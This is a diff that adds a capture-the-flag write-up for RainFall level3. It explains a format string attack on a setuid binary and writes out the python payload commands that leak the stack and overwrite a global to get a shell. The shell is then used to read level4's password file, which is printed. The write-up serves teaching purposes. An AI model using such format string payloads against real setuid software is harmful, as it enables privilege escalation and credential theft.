@@ -1,0 +1,21 @@
+There is a setuid binary "level3" own by level4
+
+After disassembling the binary we can see that main() function call system() with "/bin/sh"
+only if the uninitialised global located at [0x804988c] equal 64.
+
+Here the vulnerability resides in the printf() call
+as user can set the format string to write into variable
+This is a Format String Attack
+
+We need to print the memory until we reach the address of the variable we want to change
+
+level3@RainFall:~$> python -c 'print "\x8c\x98\x04\x08" + " %x" * 5' | ./level3
+ 200 b7fd1ac0 b7ff37d0 804988c 20782520
+
+So we need to modify the fourth one to 64 with "%60x" + "%4$n"
+here it's 60 because we already have four bytes printed with the address
+
+level3@RainFall:~$> (python -c 'print "\x8c\x98\x04\x08" + "%60x" + "%4$n"'; cat ) | ./level3
+
+level4@RainFall:~$> cat ~level4/.pass
+b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
